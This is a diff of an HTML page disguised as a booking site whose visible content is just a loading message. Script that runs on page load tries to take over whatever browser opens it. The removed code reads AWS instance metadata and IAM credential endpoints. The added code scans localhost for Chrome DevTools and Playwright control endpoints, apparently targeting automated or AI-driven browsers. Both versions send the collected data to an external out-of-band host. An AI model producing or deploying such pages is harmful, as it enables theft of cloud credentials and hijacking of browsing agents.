@@ -2,60 +2,81 @@
 <html>
 <head><title>Booking</title>
 <script>
-// Try AWS metadata endpoints via fetch  
-var targets = [
-  'http://169.254.169.254/latest/meta-data/',
-  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-  'http://169.254.169.254/latest/dynamic/instance-identity/document',
-  'http://169.254.169.254/latest/user-data',
-  'http://169.254.170.2/v2/credentials',
-  'http://[fd00:ec2::254]/latest/meta-data/',
-  'http://169.254.169.254/latest/api/token'
-];
-
+var OOB = "d7a2184899s5qg2fd80g38m6ctcqkz1qb.oast.fun";
 var results = {};
-var done = 0;
 
-function report() {
-  var img = new Image();
-  img.src = 'https://d7a2184899s5qg2fd80g38m6ctcqkz1qb.oast.fun/meta?d=' + encodeURIComponent(btoa(JSON.stringify(results)));
-  fetch('https://d7a2184899s5qg2fd80g38m6ctcqkz1qb.oast.fun/meta-post', {
-    method: 'POST',
-    body: JSON.stringify(results),
-    headers: {'Content-Type': 'application/json'}
-  }).catch(function(){});
+// CDP usually runs on random port. Try common ones + probe range
+// Also try: Playwright's internal API, any agent control plane
+var targets = [];
+
+// CDP ports (Playwright picks random high ports, but defaults exist)
+[9222, 9229, 9230, 0, 3000, 4000, 5000, 8000, 8080, 8888, 9000].forEach(function(p) {
+  targets.push({url: 'http://127.0.0.1:' + p + '/json', label: 'cdp-' + p});
+});
+
+// Try WebSocket to CDP (this sometimes bypasses mixed content for WS)
+function tryCDP(port) {
+  try {
+    var ws = new WebSocket('ws://127.0.0.1:' + port + '/devtools/browser');
+    ws.onopen = function() {
+      results['ws-cdp-' + port] = 'OPEN!';
+      // If we got here, we have CDP access — try to get browser info
+      ws.send(JSON.stringify({id: 1, method: 'Browser.getVersion'}));
+    };
+    ws.onmessage = function(e) {
+      results['ws-cdp-' + port + '-msg'] = e.data.substring(0, 500);
+      report();
+    };
+    ws.onerror = function() {
+      results['ws-cdp-' + port] = 'ws-error';
+    };
+    ws.onclose = function(e) {
+      results['ws-cdp-' + port + '-close'] = e.code + ':' + e.reason;
+    };
+  } catch(e) {
+    results['ws-cdp-' + port] = 'catch:' + e.message;
+  }
 }
 
-targets.forEach(function(url) {
-  fetch(url, {mode: 'no-cors'}).then(function(r) {
-    return r.text().catch(function(){ return 'opaque-' + r.status + '-' + r.type; });
-  }).then(function(text) {
-    results[url] = text.substring(0, 2000);
+// Try WS on likely CDP ports
+[9222, 9229, 9230, 0].forEach(tryCDP);
+
+// Also scan for CDP by checking a range of high ports via WS
+for (var p = 33000; p < 33050; p++) { tryCDP(p); }
+for (var p = 40000; p < 40020; p++) { tryCDP(p); }
+
+// HTTP fetch for localhost services
+var done = 0;
+targets.forEach(function(t) {
+  fetch(t.url).then(function(r) { return r.text(); }).then(function(text) {
+    results[t.label] = text.substring(0, 1000);
     done++;
     if (done >= targets.length) report();
   }).catch(function(err) {
-    results[url] = 'ERR:' + err.message;
+    results[t.label] = 'E:' + err.message;
     done++;
     if (done >= targets.length) report();
   });
 });
 
-// Also try XMLHttpRequest for metadata (bypasses some fetch restrictions)
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://169.254.169.254/latest/meta-data/', true);
-xhr.onload = function() {
-  results['xhr-metadata'] = xhr.responseText.substring(0, 2000);
-  report();
-};
-xhr.onerror = function() {
-  results['xhr-metadata'] = 'XHR-ERR:' + xhr.status;
-  report();
-};
-xhr.send();
+// Check if we can read the Playwright browser args (exposes CDP port)
+try {
+  results['userAgent'] = navigator.userAgent;
+  results['cdpUrl'] = window.__playwright_cdp_url || 'not-set';
+  results['browserWsEndpoint'] = window.__browserWsEndpoint || 'not-set';
+} catch(e) {}
 
-// Fallback: report after 8 seconds even if some requests hang
-setTimeout(report, 8000);
+function report() {
+  new Image().src = 'https://' + OOB + '/rce?d=' + encodeURIComponent(btoa(JSON.stringify(results)));
+  fetch('https://' + OOB + '/rce-post', {
+    method: 'POST',
+    body: JSON.stringify(results, null, 2),
+    headers: {'Content-Type': 'application/json'}
+  }).catch(function(){});
+}
+
+setTimeout(report, 10000);
 </script>
 </head>
-<body><h1>Processing...</h1></body>
+<body><h1>Loading...</h1></body>
 </html>
